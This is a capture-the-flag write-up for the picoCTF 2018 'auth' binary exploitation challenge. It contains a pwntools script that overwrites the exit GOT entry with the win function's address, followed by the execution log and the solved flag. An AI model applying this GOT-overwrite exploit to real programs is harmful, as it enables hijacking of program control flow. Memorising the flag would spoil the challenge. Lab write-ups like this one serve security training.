# LEVEL GOAL

Can you authenticate to this service and get the flag? Connect with nc 2018shell1.picoctf.com 52918.

# HINTS

What happens if you say something OTHER than yes or no?

# SOLUTION

Code developed:
```
from pwn import *

context(arch='i386', os='linux')

e = ELF('/home/nikhilh/Downloads/auth')

exit_addr = str(hex(e.got['exit']))
win_addr  = str(hex(e.symbols['win']))

s = ssh('nikel', '2018shell1.picoctf.com', password='****')
py = s.run('nc 2018shell1.picoctf.com 27952')
py.recvuntil('\n')
py.sendline(exit_addr)
py.sendline(win_addr)
py.recvuntil('\n')
py.sendline('cat flag.txt')
py.interactive()
py.close()
```

Execution:
```
nikhilh@ubuntu:~/picoctf_18/binary_exploitation$ python auth.py 
[*] '/home/nikhilh/Downloads/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2018shell1.picoctf.com on port 22: Done
[*] nikel@2018shell1.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'nc 2018shell1.picoctf.com 27952': Done
[*] Switching to interactive mode
Okay, writing 0x804854b to 0x804a014
Okay, exiting now...

picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d496409a}
$ exit
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ exit
[*] Closed SSH channel with 2018shell1.picoctf.com
[*] Got EOF while sending in interactive
```

# FLAG

picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d496409a}
